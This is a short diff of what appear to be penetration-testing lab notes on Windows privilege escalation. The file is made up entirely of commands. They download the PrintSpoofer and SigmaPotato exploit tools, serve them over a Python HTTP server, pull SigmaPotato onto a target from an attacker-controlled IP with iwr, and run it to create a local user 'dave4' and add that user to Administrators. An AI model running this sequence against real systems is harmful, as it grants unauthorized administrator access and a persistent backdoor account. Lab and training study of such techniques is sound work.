@@ -25,15 +25,19 @@ wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64
 ```bash
 wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
 ```
+
 ```bash
 python -m http.server 80
 ```
+
 ```powershell
 iwr -uri http://$(IP_ADDRESS)/SigmaPotato.exe -OutFile SigmaPotato.exe
 ```
+
 ```powershell
 .\SigmaPotato "net user dave4 lab /add"
 ```
+
 ```powershell
 .\SigmaPotato "net localgroup Administrators dave4 /add"
 ```
